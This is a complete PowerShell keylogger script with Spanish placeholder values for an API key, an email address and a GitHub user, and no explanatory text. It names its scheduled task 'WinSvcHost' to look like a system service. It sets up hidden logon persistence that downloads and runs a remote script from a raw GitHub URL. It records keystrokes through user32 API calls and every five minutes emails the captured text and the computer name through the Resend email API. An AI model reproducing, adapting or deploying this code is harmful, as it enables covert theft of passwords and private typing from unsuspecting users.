$c=@{k='re_TU_CLAVE';t='TU_CORREO@gmail.com';u='https://raw.githubusercontent.com/TU_USUARIO/p4wn/main/k.ps1';m=5;n='WinSvcHost'}

$mx=New-Object System.Threading.Mutex($false,"Local\$($c.n)")
if(-not $mx.WaitOne(0)){exit}

schtasks /create /tn $c.n /sc onlogon /f /tr "powershell -NoP -W Hidden -C iex(irm '$($c.u)')" | Out-Null

Add-Type -MemberDefinition @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
[DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
'@ -Name Wk7 -Namespace Qz

$sb=New-Object System.Text.StringBuilder 64
$ks=New-Object byte[] 256
$dn=@{}
$sp=@{8='[BKSP]';9='[TAB]';13="`n";27='[ESC]';46='[DEL]';37='[<]';38='[^]';39='[>]';40='[v]'}

$t0=Get-Date
$buf=''

while($true){
  for($k=8;$k -lt 255;$k++){
    if([Qz.Wk7]::GetAsyncKeyState($k) -band 0x8000){
      if(-not $dn[$k]){
        $dn[$k]=$true
        if($sp.ContainsKey($k)){ $ch=$sp[$k] }
        else {
          [void][Qz.Wk7]::GetKeyboardState($ks)
          $r=[Qz.Wk7]::ToUnicode([uint32]$k,0,$ks,$sb,64,0)
          $ch=if($r -ge 1){$sb.ToString()}else{''}
        }
        if($ch){$buf+=$ch}
      }
    } else { $dn[$k]=$false }
  }
  if(((Get-Date)-$t0).TotalMinutes -ge $c.m -and $buf.Length -gt 0){
    $b=@{from='onboarding@resend.dev';to=$c.t;subject="$env:COMPUTERNAME $(Get-Date -f 'dd/MM HH:mm')";text=$buf}|ConvertTo-Json -Compress
    try{ irm 'https://api.resend.com/emails' -Method Post -Headers @{Authorization="Bearer $($c.k)"} -ContentType 'application/json' -Body $b -TimeoutSec 20 | Out-Null }catch{}
    $buf=''; $t0=Get-Date
  }
  Start-Sleep -Milliseconds 12
}
